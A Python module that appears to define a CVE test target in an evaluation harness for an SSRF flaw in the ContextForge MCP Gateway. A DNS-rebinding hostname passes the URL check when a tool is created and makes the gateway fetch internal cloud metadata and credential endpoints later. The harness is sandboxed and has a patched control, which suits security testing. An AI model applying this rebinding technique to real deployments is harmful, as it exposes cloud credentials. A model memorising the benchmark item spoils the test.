"""CVE-2026-18905: IBM ContextForge MCP Gateway SSRF by DNS-rebinding TOCTOU at REST tool
invocation (CWE-918).

mcpgateway validates a REST tool's URL against its SSRF guard only when the tool is created; at
invocation (tools/call) <= 1.0.6 fetches the URL with no re-validation. A rebinding hostname that
resolves to a public address at creation time (passing the guard) and to an internal address at
invocation time makes the gateway fetch that internal address and return its body: reach =
internal_fetch. 1.0.7 re-resolves and pins the host at invocation, so the link-local metadata
addresses (169.254.0.0/16, in ssrf_blocked_networks) are blocked and no nonce surfaces.

The real PyPI package runs unchanged; the image's entrypoint registers one REST tool per planted
endpoint, flips /etc/hosts from the public to the internal sentinel address, and exposes the
virtual server over MCP stdio. The gateway runs as root inside the sentinels' network namespace
holder, so the host keeps has_network=False and no /srv mount (the flaw is a network fetch, not a
filesystem read), rather than the batch's /srv + has_network=True default.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import contextforge_ssrf_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

# Every exploit tool call carries the probe marker; the benign tools/list does not, keeping the
# negative control un-aimed.
AIM = re.compile(r"x-ssrf-probe")

KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")


async def _find_tool(client: MCPClientPort, place_id: str) -> str:
    # The gateway slugifies the registered tool name, so match on the description set per place.
    for tool in await client.list_tools():
        if (tool.description or "").endswith(place_id):
            return tool.name
    raise RuntimeError(f"no tool exposed for place {place_id}")


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        name = await _find_tool(client, place_id)
        await client.call_tool(name, {"marker": "x-ssrf-probe"})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # A legitimate MCP operation that triggers no outbound fetch and surfaces no nonce.
    await client.list_tools()


TARGET = CVETarget(
    cve_id="CVE-2026-18905",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.INTERNAL_FETCH,
    aim=AIM,
    reaches=frozenset({"internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-18905-contextforge", "sentinel"),
    server_image="holdout-2026-18905-contextforge",
    patched_image="holdout-2026-18905-contextforge-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory="/tmp", has_network=False
    ),
    builder=contextforge_ssrf_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "SSRF (CWE-918): the gateway validates a REST tool's URL against its SSRF guard only at "
        "tool creation, not at invocation, so a DNS-rebinding host that resolves public at "
        "creation and internal at invocation makes it fetch an internal address and return the "
        "body."
    ),
    tools_filter=None,
)
